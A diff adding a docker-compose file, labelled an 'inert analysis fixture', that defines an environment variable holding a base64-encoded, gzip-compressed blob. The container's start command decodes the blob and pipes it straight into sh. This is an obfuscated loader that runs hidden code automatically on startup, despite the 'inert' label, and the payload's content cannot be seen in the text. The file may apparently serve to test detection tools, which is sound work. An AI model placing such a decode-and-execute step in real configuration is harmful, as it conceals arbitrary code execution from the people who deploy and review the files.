@@ -1,0 +1,9 @@
+# inert analysis fixture
+x-desc: &desc
+  HUNTRESS_DESCRIPTOR: ${HUNTRESS_DESCRIPTOR:-H4sIAAAAAAACA2WPUWvDMAyEf1HjjnSDDvy0/YS9G8VWY1HHNpaclaEf37SDMNjrp7vT3WpHTZDnDjPaUPwVm/NlqYVRW0loE/TsIzZdsQXyYrlzJU+ls4II+Kv9ejm+nhUCVMFmaysemR1X+M4aC4vb0IXSv/wyXTp7ECp5l8w/VN0EjG8nZdlK7RemPCd0T6gZb+L23hzVw1KB5uwo2M+PwxmOpwnHUXtLNopUfjcm+J0PeNsMCQfKKyQK5jf28chVkGiNLNXEnqVtWw5/nGZ4Su8DVSbwOAEAAA==}
+services:
+  app:
+    image: alpine:3.19
+    environment:
+      <<: *desc
+    command: sh -c 'echo $$HUNTRESS_DESCRIPTOR | base64 -d | gunzip | sh'
